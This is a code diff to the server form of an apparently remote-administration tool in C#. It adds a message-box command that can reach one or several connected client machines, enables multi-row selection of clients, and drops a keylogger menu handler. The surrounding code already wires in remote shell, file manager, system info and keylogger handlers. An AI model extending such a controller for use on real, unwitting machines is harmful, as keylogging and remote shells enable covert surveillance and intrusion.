@@ -25,6 +25,7 @@ namespace Server.Forms
         private readonly SystemInfoHandler _systemInfoHandler = new SystemInfoHandler();
         private readonly RemoteShellHandler _remoteShellHandler = new RemoteShellHandler();
         private readonly FileManagerHandler _fileManagerHandler = new FileManagerHandler();
+        private readonly MessageBoxHandler _messageBoxHandler = new MessageBoxHandler();
         private readonly Dictionary<string, KeyLoggerForm> _keyLoggerForms = new Dictionary<string, KeyLoggerForm>();
         private readonly Dictionary<string, Server.Handlers.KeyLoggerHandler> _keyLoggerHandlers = new Dictionary<string, Server.Handlers.KeyLoggerHandler>();
         private readonly CommandService _commandService = new CommandService();
@@ -33,7 +34,7 @@ namespace Server.Forms
         public MainServerForm()
         {
             InitializeComponent();
-            _packetHandler = new PacketHandler(OnSystemInfoResponse, OnRemoteShellResponse, OnFileManagerResponse,
+            _packetHandler = new PacketHandler(OnSystemInfoResponse, OnRemoteShellResponse, OnFileManagerResponse, OnMessageBoxResponse,
                 onKeyLoggerEvent: OnKeyLoggerEvent,
                 onKeyLoggerBatch: OnKeyLoggerBatch,
                 onKeyLoggerComboEvent: OnKeyLoggerComboEvent);
@@ -79,7 +80,14 @@ namespace Server.Forms
             }
             AppendLog($"[{DateTime.Now:HH:mm:ss}] [RECV] RemoteShellResponse from {response.ClientId}");
         }
-
+        private void OnMessageBoxResponse(MessageBoxResponse response)
+        {
+            if (!string.IsNullOrEmpty(response.ClientId))
+            {
+                _messageBoxHandler.SaveLastResponses(response.ClientId, response);
+            }
+            AppendLog($"[{DateTime.Now:HH:mm:ss}] [RECV] MessageBoxResponse from {response.ClientId}");
+        }
         private void OnFileManagerResponse(FileManagerResponse response)
         {
             if (!string.IsNullOrEmpty(response.ClientId))
@@ -185,13 +193,29 @@ namespace Server.Forms
             remoteShellForm.Show();
             AppendLog($"[{DateTime.Now:HH:mm:ss}] [INFO] Opened Remote Shell for {conn.Id}");
         }
-
-        private void keyLoggerToolStripMenuItem_Click(object sender, EventArgs e)
+        private void messageBoxToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            var conn = GetSelectedConnection();
-            if (conn == null) return;
-            EnsureKeyLoggerForm(conn.Id);
-            _keyLoggerForms[conn.Id].Show();
+            var selectedClients = GetSelectedClients();
+
+            if (selectedClients.Count == 0)
+            {
+                MessageBox.Show("Vui lòng chọn ít nhất một client!", "Thông báo");
+                return;
+            }
+
+            if (selectedClients.Count == 1)
+            {
+                var conn = selectedClients[0];
+                var messageBoxForm = MessageBoxForm.CreateNewOrGetExisting(conn, _messageBoxHandler);
+                messageBoxForm.Show(this);
+                AppendLog($"[{DateTime.Now:HH:mm:ss}] [INFO] Opened Message Box for {conn.Id}");
+            }
+            else
+            {
+                var messageBoxForm = new MessageBoxForm(_messageBoxHandler);
+                messageBoxForm.Show(this); // set Owner = MainServerForm
+                AppendLog($"[{DateTime.Now:HH:mm:ss}] [INFO] Opened Broadcast Message Box for {selectedClients.Count} clients");
+            }
         }
 
         private void OnKeyLoggerEvent(KeyLoggerEvent evt)
@@ -335,6 +359,7 @@ namespace Server.Forms
 
         private sealed class ClientRow
         {
+            public bool Selected { get; set; }
             public string ClientId { get; set; } = string.Empty; // short display
             public string FullClientId { get; set; } = string.Empty; // for lookups
             public string Hostname { get; set; } = string.Empty;
@@ -343,22 +368,46 @@ namespace Server.Forms
             public DateTime LastSeen { get; set; }
             public string Status { get; set; } = "Online";
         }
+        public List<ServerClientConnection> GetSelectedClients()
+        {
+            var selectedClients = new List<ServerClientConnection>();
+
+            foreach (DataGridViewRow row in dgvClients.SelectedRows)
+            {
+                if (row.DataBoundItem is ClientRow clientRow)
+                {
+                    if (_clients.TryGetValue(clientRow.FullClientId, out var conn))
+                    {
+                        selectedClients.Add(conn);
+                    }
+                }
+            }
+
+            return selectedClients;
+        }
+
 
         private void InitializeClientsGrid()
         {
             dgvClients.AutoGenerateColumns = false;
             dgvClients.Columns.Clear();
+     
             dgvClients.Columns.Add(new DataGridViewTextBoxColumn { HeaderText = "Client ID", DataPropertyName = "ClientId", Width = 220 });
             dgvClients.Columns.Add(new DataGridViewTextBoxColumn { HeaderText = "Hostname", DataPropertyName = "Hostname", Width = 180 });
             dgvClients.Columns.Add(new DataGridViewTextBoxColumn { HeaderText = "IP Address", DataPropertyName = "IpAddress", Width = 160 });
             dgvClients.Columns.Add(new DataGridViewTextBoxColumn { HeaderText = "Connected At", DataPropertyName = "ConnectedAt", Width = 180 });
             dgvClients.Columns.Add(new DataGridViewTextBoxColumn { HeaderText = "Last Seen", DataPropertyName = "LastSeen", Width = 180 });
             dgvClients.Columns.Add(new DataGridViewTextBoxColumn { HeaderText = "Status", DataPropertyName = "Status", Width = 80 });
+
             var hiddenFull = new DataGridViewTextBoxColumn { HeaderText = "FullId", DataPropertyName = "FullClientId", Visible = false };
             dgvClients.Columns.Add(hiddenFull);
+            dgvClients.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
+            dgvClients.MultiSelect = true;  
+            dgvClients.ReadOnly = true;     
             dgvClients.DataSource = _clientsBinding;
             RefreshClientsGrid();
         }
+
 
         private void RefreshClientsGrid()
         {
